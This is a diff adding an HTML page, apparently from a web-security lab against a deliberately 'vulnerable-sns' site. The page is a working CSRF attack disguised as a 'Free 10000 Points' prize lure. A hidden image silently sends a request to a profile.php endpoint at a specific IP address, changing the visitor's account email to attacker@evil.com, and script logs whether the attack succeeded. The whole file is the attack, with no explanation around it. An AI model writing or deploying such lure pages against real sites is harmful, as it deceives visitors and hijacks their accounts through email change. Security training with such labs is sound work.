@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Free 10000 Points!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: white;
+            color: #333;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 10px 50px rgba(0,0,0,0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Congratulations!</h1>
+        <p>You've won 10,000 points!</p>
+        <p>Click the button below to claim your reward</p>
+        <button onclick="location.reload()">Claim Now</button>
+    </div>
+    
+    <!-- Hidden CSRF Attack -->
+    <img src="http://18.179.53.107/vulnerable-sns/www/profile.php?email=attacker@evil.com&full_name=Hacked&bio=CSRF_Attack" 
+         style="display:none" 
+         onload="attackSuccess()" 
+         onerror="attackFailed()">
+    
+    <script>
+        function attackSuccess() {
+            console.log('[+] CSRF attack successful');
+        }
+        function attackFailed() {
+            console.log('[-] CSRF attack failed');
+        }
+    </script>
+</body>
+</html>
